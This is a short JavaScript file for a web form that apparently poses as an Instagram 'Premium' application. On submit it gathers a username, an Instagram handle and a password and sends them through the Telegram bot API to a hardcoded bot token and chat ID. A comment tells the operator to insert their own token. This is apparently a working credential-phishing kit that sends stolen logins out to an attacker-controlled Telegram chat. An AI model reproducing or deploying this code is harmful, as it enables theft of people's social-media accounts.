// script.js

document.getElementById("year").textContent = new Date().getFullYear();

const form = document.getElementById("premiumForm");
const status = document.getElementById("status");

// 👉 Ин ҷо токен ва chat_id-и худро гузор:
const BOT_TOKEN = "8202428141:AAEQsYhcSsW97cqLoD-99MgJsag_eout2EM";
const CHAT_ID = "6443403835";

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  status.textContent = "Отправка...";

  const formData = new FormData(form);

  const fullName = formData.get("fullName");
  const telegram = formData.get("telegram");
  const instagram = formData.get("instagram");
  const message = formData.get("message");

  const text =
    `📩 Заявка на Premium\n` +
    `👤 Username: ${fullName}\n` +
    `📷 Instagram: ${telegram}\n` +
    `🔑 Пароль: ${instagram}\n` +
    `📝 Сообщение: ${message}`;

  try {
    const res = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text,
          parse_mode: "HTML",
        }),
      }
    );

    if (res.ok) {
      status.textContent = "✅ Заявка отправлена!";
      form.reset();
    } else {
      status.textContent = "❌ Ошибка отправки.";
    }
  } catch (err) {
    status.textContent = "⚠ Не удалось отправить.";
    console.error(err);
  }
});
